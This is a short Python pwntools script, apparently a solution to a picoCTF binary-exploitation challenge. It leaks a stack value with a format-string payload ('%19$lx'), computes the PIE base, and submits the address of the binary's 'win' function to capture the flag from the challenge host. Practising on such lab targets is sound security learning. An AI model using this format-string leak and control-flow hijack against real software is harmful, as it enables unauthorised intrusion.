#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rescued-float.picoctf.net", 61387)

    return r


def main():
    r = conn()

    r.sendlineafter(b"name:", b"%19$lx")
    exe.address = int(r.recvline().strip(), 16) - (exe.sym.main + 65)
    log.info(f"PIE: 0x{exe.address:x}")

    r.sendlineafter(b"0x12345: ", hex(exe.sym.win).encode())
    flag = r.recvlines(2)[-1].decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
